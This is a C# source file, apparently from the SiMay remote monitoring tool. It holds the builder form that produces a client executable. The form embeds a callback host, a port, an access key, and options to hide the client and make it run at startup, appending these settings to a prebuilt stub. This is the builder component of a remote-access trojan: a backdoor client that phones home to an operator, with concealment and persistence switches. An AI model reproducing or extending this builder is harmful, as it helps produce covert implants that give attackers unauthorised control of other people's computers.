using SiMay.Core.Entitys;
using SiMay.RemoteMonitor.Entitys;
using SiMay.Serialize;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SiMay.RemoteMonitor.MainForm
{

    public partial class BuilderServiceForm : Form
    {

        public BuilderServiceForm()
        {
            InitializeComponent();
        }

        private IDictionary<string, string> localHosts = new Dictionary<string, string>();

        private void button1_Click(object sender, EventArgs e)
        {

            if (mls_address.Text == "" || mls_port.Text == "")
            {
                MessageBox.Show("请输入完整正确的上线信息,否则可能造成上线失败!", "提示", 0, MessageBoxIcon.Exclamation);
                return;
            }

            Socket testSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                testSock.Connect(mls_address.Text, int.Parse(mls_port.Text));
                testSock.Close();
                MessageBox.Show("连接: " + mls_address.Text + ":" + mls_port.Text + " 成功!", "连接成功", 0, MessageBoxIcon.Exclamation);
            }
            catch
            {
                MessageBox.Show("连接: " + mls_address.Text + ":" + mls_port.Text + " 失败!", "连接失败", 0, MessageBoxIcon.Error);
            }
        }

        private string GetHostByName(string ip)
        {
            string _return = null;
            try
            {
                IPHostEntry hostinfo = Dns.GetHostByName(ip);
                IPAddress[] aryIP = hostinfo.AddressList;
                _return = aryIP[0].ToString();
            }
            catch { }

            return _return;
        }

        private void button3_Click(object sender, EventArgs e)
        {

            if (mls_address.Text == "" || mls_port.Text == "" || txtInitName.Text == "" || txtAccesskey.Text == "")
            {
                MessageBox.Show("请输入完整正确的上线信息,否则可能造成上线失败!", "提示", 0, MessageBoxIcon.Exclamation);
                return;
            }

            logList.Items.Clear();

            logList.Items.Add("配置信息初始化..");

            var options = new ServiceOptions()
            {
                Id = Guid.NewGuid().ToString(),
                Host = mls_address.Text,
                Port = int.Parse(mls_port.Text),
                Remark = txtInitName.Text,
                AccessKey = int.Parse(txtAccesskey.Text),
                IsHide = ishide.Checked,
                IsAutoRun = sutoRun.Checked,
                IsMutex = mutex.Checked,
                SessionMode = int.Parse(AppConfiguration.SessionMode)
            };

            if (!(ra3.Checked || ra4.Checked))
            {
                logList.Items.Add("请选择服务端运行时版本!");
                return;
            }

            string name = "SiMayService.exe";

            //if (ApplicationConfiguration.SessionMode != "0")
            //    name = "SiMayServiceEx.exe";

            string datfileName = Application.StartupPath + "\\dat\\{0}\\{1}";

            if (ra3.Checked)
                datfileName = string.Format(datfileName, "3.5", name);

            if (ra4.Checked)
                datfileName = string.Format(datfileName, "4.0", name);

            logList.Items.Add("准备将配置信息写入文件中");

            if (!File.Exists(datfileName))
            {
                logList.Items.Add("配置文件不存在.");
                return;
            }

            SaveFileDialog dlg = new SaveFileDialog();
            dlg.Filter = "可执行文件|*.exe";
            dlg.Title = "生成";
            dlg.FileName = "SiMayService";
            if (dlg.ShowDialog() != DialogResult.OK)
            {
                logList.Items.Add("配置信息写入被终止了!");
                return;
            }
            if (dlg.FileName != "")
            {
                logList.Items.Add("配置信息写入中...");
                var optionsBytes = PacketSerializeHelper.SerializePacket(options);
                bool err = WirteOptions(optionsBytes, datfileName, dlg.FileName);

                if (err != true)
                {
                    logList.Items.Add("配置信息写入失败,请检查配置文件是否被占用!");
                    return;
                }

                logList.Items.Add("配置信息写入成功!");
            }
            else
            {
                logList.Items.Add("配置信息写入被终止了!");
                return;
            }
            MessageBox.Show("服务端文件已生成到位置:" + dlg.FileName + "", "提示", 0, MessageBoxIcon.Exclamation);

            this.Close();
        }

        public bool WirteOptions(byte[] options, string sourcefileName, string fileName)
        {
            //追加位置写入
            try
            {

                byte[] Bytes = new byte[sizeof(Int16) + sizeof(Int32) + options.Length];//长度加标识
                options.CopyTo(Bytes, 0);
                BitConverter.GetBytes(options.Length).CopyTo(Bytes, options.Length);
                BitConverter.GetBytes((short)9999).CopyTo(Bytes, options.Length + sizeof(Int32));

                byte[] SourceFileData = File.ReadAllBytes(sourcefileName);
                FileStream fs = new FileStream(fileName, FileMode.Create);
                fs.Write(SourceFileData, 0, SourceFileData.Length);
                fs.Seek(0, SeekOrigin.End);
                fs.Write(Bytes, 0, Bytes.Length);
                fs.Flush();
                fs.Close();
                fs.Dispose();
                return true;
            }
            catch
            {
                return false;
            }

            //寻位写入
            //try
            //{
            //    int location = 0;
            //    byte[] fileBytes = File.ReadAllBytes(sourcefileName);
            //    for (int i = 0; i < fileBytes.Length; i++)
            //    {
            //        if (i + 514 <= fileBytes.Length)
            //        {
            //            if (fileBytes[i] == 91 && fileBytes[i + 514] == 93)
            //            {
            //                location = i;
            //                break;
            //            }
            //        }
            //    }

            //    byte[] b = System.IO.File.ReadAllBytes(sourcefileName);
            //    byte[] value = Encoding.Unicode.GetBytes(ReplaceString);
            //    FileStream fs = new FileStream(fileName, FileMode.Create);
            //    fs.Write(b, 0, b.Length);
            //    fs.Seek(location, SeekOrigin.Begin);
            //    fs.Write(value, 0, value.Length);
            //    fs.Seek(location + value.Length, SeekOrigin.Begin);
            //    byte[] by = new byte[514 - value.Length];
            //    for (int i = 0; i < by.Length; i++)
            //    {
            //        by[i] = 0x00;
            //    }
            //    fs.Write(by, 0, by.Length);
            //    fs.Flush();
            //    fs.Close();
            //    fs.Dispose();
            //    return true;
            //}
            //catch
            //{
            //    return false;
            //}
        }

        private void BuildClientForm_Load(object sender, EventArgs e)
        {
            txtAccesskey.Text = AppConfiguration.ConnectPassWord;
            string strHosts = AppConfiguration.LHostString;

            string[] strarrays = strHosts.Split(',');

            for (int i = 0; i < strarrays.Length - 1; i++)
            {
                string[] strs = strarrays[i].Split(':');

                if (!localHosts.ContainsKey(strs[0]))
                {
                    localHosts.Add(strs[0], strs[1]);
                    mls_address.Items.Add(strs[0]);
                    mls_port.Items.Add(strs[1]);
                }
                else
                    logList.Items.Add("..配置文件存在重复域名!");
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (mls_address.SelectedIndex < 0)
            {
                MessageBox.Show("请选中地址记录", "提示", 0, MessageBoxIcon.Exclamation);
                return;
            }
            if (MessageBox.Show("确定该地址记录吗?", "提示", MessageBoxButtons.OKCancel, MessageBoxIcon.Error) == DialogResult.OK)
            {
                localHosts.Remove(mls_address.Items[mls_address.SelectedIndex].ToString());
                mls_address.Items.RemoveAt(mls_address.SelectedIndex);
                mls_port.Items.RemoveAt(mls_port.SelectedIndex);
                SaveAddressInfo();
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (mls_address.Text == "" || mls_port.Text == "" || txtInitName.Text == "")
            {
                MessageBox.Show("请输入完整正确的上线信息,否则可能造成上线失败!", "提示", 0, MessageBoxIcon.Exclamation);
                return;
            }
            if (!localHosts.ContainsKey(mls_address.Text))
            {
                localHosts.Add(mls_address.Text, mls_port.Text);
                mls_address.Items.Add(mls_address.Text);
                mls_port.Items.Add(mls_port.Text);
            }
            else
            {
                logList.Items.Add("记录已存在!保存失败");
            }

            SaveAddressInfo();
        }

        private void SaveAddressInfo()
        {
            string str = "";
            foreach (KeyValuePair<string, string> item in localHosts)
            {
                str += item.Key + ":" + item.Value + ",";
            }

            AppConfiguration.LHostString = str;
            logList.Items.Add("记录已保存");

        }
        private void mls_address_SelectedIndexChanged(object sender, EventArgs e)
        {
            mls_port.Text = localHosts[mls_address.Text];
        }
    }
}